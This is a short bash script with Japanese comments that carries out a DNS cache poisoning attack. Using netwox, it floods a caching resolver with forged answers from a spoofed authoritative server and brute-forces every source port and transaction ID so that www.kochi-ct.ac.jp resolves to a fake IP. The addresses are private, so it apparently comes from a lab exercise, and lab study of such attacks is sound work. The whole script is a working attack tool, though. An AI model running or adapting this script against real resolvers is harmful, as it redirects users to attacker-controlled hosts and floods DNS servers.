#!/bin/bash
# dns_spoof_port_txid_flood.sh
# TXID + ソースポート総当たり型
# Ubuntu22.04 + netwox105

CACHE_DNS="192.168.56.102"    # キャッシュDNSサーバ
AUTH_DNS="192.168.56.103"     # 権威DNSサーバ（送信元偽装）
FAKE_IP="192.168.56.104"      # 偽Aレコード
DOMAIN="www.kochi-ct.ac.jp"   # ターゲットドメイン
TTL="300"                     # 偽応答TTL
BURST=200                     # 並列で送る数

echo "[*] 攻撃開始: ${DOMAIN} → ${FAKE_IP}"
echo "[*] キャッシュDNS(${CACHE_DNS})にTXIDとポートを総当たりで偽応答送信"

for PORT in $(seq 1024 65535); do
  for TXID in $(seq 0 65535); do
    HEX=$(printf "0x%04x" $TXID)

    sudo netwox 105 \
      -d $CACHE_DNS \
      -D $PORT \
      -s $AUTH_DNS \
      -S 53 \
      -q $HEX \
      -n $DOMAIN \
      -a $FAKE_IP \
      -A 1 \
      -T $TTL \
      >/dev/null 2>&1 &

    # 並列BURST件ごとに同期
    if (( ($TXID + $PORT) % $BURST == 0 )); then
      wait
      printf "\r[+] 送信中: PORT=%5d TXID=%5d" $PORT $TXID
    fi
  done
done

wait
echo
echo "[+] 偽応答送信完了。キャッシュを確認してください。"
